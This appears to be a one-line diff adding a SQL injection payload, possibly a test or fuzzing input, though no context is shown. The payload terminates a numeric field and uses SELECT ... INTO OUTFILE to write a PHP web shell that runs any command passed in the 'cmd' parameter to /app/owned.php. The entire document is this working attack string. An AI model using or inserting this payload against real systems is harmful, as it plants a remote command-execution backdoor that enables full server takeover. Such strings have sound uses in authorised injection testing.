@@ -1,0 +1,1 @@
+0; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/app/owned.php'; -- 
